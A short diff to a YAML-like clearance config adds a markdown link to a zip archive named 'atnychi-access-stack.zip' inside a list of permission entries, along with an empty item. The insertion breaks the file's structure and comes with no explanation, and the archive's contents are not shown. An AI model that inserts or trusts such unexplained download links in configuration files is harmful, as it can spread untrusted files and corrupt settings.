@@ -32,3 +32,6 @@ tier1_clearance:
       - full_system_overview
       - kill_switch_access
       - no_real_time_execution_without_authorization
+      - [atnychi-access-stack.zip](https://github.com/user-attachments/files/20050639/atnychi-access-stack.zip)
+
+      - 
